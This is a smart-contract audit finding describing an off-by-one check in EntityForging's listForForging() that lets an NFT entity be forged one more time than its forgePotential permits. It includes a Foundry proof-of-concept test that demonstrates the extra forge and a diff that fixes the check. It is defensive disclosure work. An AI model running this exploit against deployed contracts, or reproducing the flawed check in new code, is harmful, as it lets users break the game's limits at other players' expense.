# Vulnerability details

## Summary

Forger can exceeds its forgePotential and forge more times than allowed. This happens due to wrong check in the `listForForging() `function in `EntityForging.sol`

## Vulnerability Details / Impact

```solidity
@>> require(forgePotential > 0 && forgingCounts[tokenId] <= forgePotential, "Entity has reached its forging limit");
```

This checks if the forge potential is **<=** forgingCounts[tokenId]. 
The forgingCounts is incremented upon forging, but you shouldn't be able to list an entity with forgingCounts which are == forge potential as it's already at its max. This results in being able to forge the entity **one more time.**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";
import {console} from "forge-std/console.sol";
import {EntityForging} from "../contracts/EntityForging/EntityForging.sol";
import {TraitForgeNft} from "../contracts/TraitForgeNft/TraitForgeNft.sol";
import {Airdrop} from "../contracts/Airdrop/Airdrop.sol";
import {DevFund} from "../contracts/DevFund/DevFund.sol";
import {EntityTrading} from "../contracts/EntityTrading/EntityTrading.sol";
import {EntropyGenerator} from "../contracts/EntropyGenerator/EntropyGenerator.sol";
import {NukeFund} from "../contracts/NukeFund/NukeFund.sol";

contract FoundryTest is StdInvariant, Test {
    /* Main Contracts */
    EntropyGenerator public entropyGeneratorContract;
    EntityTrading public entityTradingContract;
    EntityForging public entityForgingContract;
    TraitForgeNft public nftContract;
    NukeFund public nukeFundContract;

    /* Misc Contracts */
    Airdrop public airdropContract;
    DevFund public devFundContract;

    /* User Addresses */
    address NFT_OWNER_FORGER = makeAddr("nftOwnerForger");
    address NFT_OWNER_MERGER = makeAddr("nftOwnerMerger");

    function setUp() public {
        /* Create contracts */
        airdropContract = new Airdrop();
        devFundContract = new DevFund();
        nftContract = new TraitForgeNft();
        entityTradingContract = new EntityTrading(address(nftContract));
        entityForgingContract = new EntityForging(address(nftContract));
        entropyGeneratorContract = new EntropyGenerator(address(nftContract));
        nukeFundContract = new NukeFund(
            address(nftContract),
            address(airdropContract),
            payable(address(devFundContract)),
            payable(address(devFundContract))
        );

        /* Link contracts via setters */
        nftContract.setEntropyGenerator(address(entropyGeneratorContract));
        nftContract.setEntityForgingContract(address(entityForgingContract));
        nftContract.setAirdropContract(address(airdropContract));
        nftContract.setNukeFundContract(payable(address(nukeFundContract)));
        entityTradingContract.setNukeFundAddress(payable(address(nukeFundContract)));
        entityForgingContract.setNukeFundAddress(payable(address(nukeFundContract)));
        devFundContract.addDev(address(this), 1);

        /* Generate FIXED entropies */
        // For this test, we want to have deterministic forger and a merger, so we mock the entropies.
        // An Entity is forger, when entropy is % 3 == 0
        uint256[] memory fixedEntropies = new uint256[](1);
        fixedEntropies[0] = 333939024444 * 1e65; // Set slot 0 -> First 2 entropies, others are 0
        entropyGeneratorContract.writeFixedEntropy(fixedEntropies);

        // Skip the "24hrs mint whitelist period" for TraitForgeNft, to avoid overloading test with merkle proofs
        skip(25 hours);
    }

    function test_forgingMultipleTimes() public {
        // Mint Forger NFT Entity
        hoax(NFT_OWNER_FORGER, 1 ether);
        nftContract.mintToken{value: 0.1 ether}(new bytes32[](0));
        assertEq(nftContract.ownerOf(1), NFT_OWNER_FORGER);
        assertTrue(nftContract.isForger(1));

        // Mint Merger NFT Entity
        hoax(NFT_OWNER_MERGER, 1 ether);
        nftContract.mintToken{value: 0.1 ether}(new bytes32[](0));
        assertEq(nftContract.ownerOf(2), NFT_OWNER_MERGER);
        assertFalse(nftContract.isForger(2));

        // Forger should have 3 potential, merger should have 4 potential
        (uint256 forgerEntropy, uint256 mergerEntropy) = nftContract.getEntropiesForTokens(1, 2);
        assertEq(potentialFromEntropy(forgerEntropy), 3);
        assertEq(potentialFromEntropy(mergerEntropy), 4);

        // Now lets list for forging and forge 3 times in a row, to exhaust the Forger's forgePotential

        // List for forging and Forge
        vm.prank(NFT_OWNER_FORGER);
        entityForgingContract.listForForging(1, 0.5 ether);
        hoax(NFT_OWNER_MERGER, 0.5 ether);
        entityForgingContract.forgeWithListed{value: 0.5 ether}(1, 2);

        // List for forging and Forge
        vm.prank(NFT_OWNER_FORGER);
        entityForgingContract.listForForging(1, 0.5 ether);
        hoax(NFT_OWNER_MERGER, 0.5 ether);
        entityForgingContract.forgeWithListed{value: 0.5 ether}(1, 2);

        // List for forging and Forge
        vm.prank(NFT_OWNER_FORGER);
        entityForgingContract.listForForging(1, 0.5 ether);
        hoax(NFT_OWNER_MERGER, 0.5 ether);
        entityForgingContract.forgeWithListed{value: 0.5 ether}(1, 2);

        // Now we can forge again, with exhausted forgePotential for Forger
        // So he will be able to Forge 4 times, with potential 3
        vm.prank(NFT_OWNER_FORGER);
        entityForgingContract.listForForging(1, 0.5 ether);
        hoax(NFT_OWNER_MERGER, 0.5 ether);
        entityForgingContract.forgeWithListed{value: 0.5 ether}(1, 2);

        // Forger has forged 4 times now, with potential 3
        assertEq(entityForgingContract.forgingCounts(1), 4);
    }

    function potentialFromEntropy(uint256 entropy) private pure returns (uint8) {
        return uint8((entropy / 10) % 10);
    }
}
```

Now run test using `forge test -vvv`.

## Recommendations
In the listForForging function change the following check:
```diff
- require(forgePotential > 0 && forgingCounts[tokenId] <= forgePotential, "Entity has reached its forging limit");
+ require(forgePotential > 0 && forgingCounts[tokenId] < forgePotential, "Entity has reached its forging limit");
```
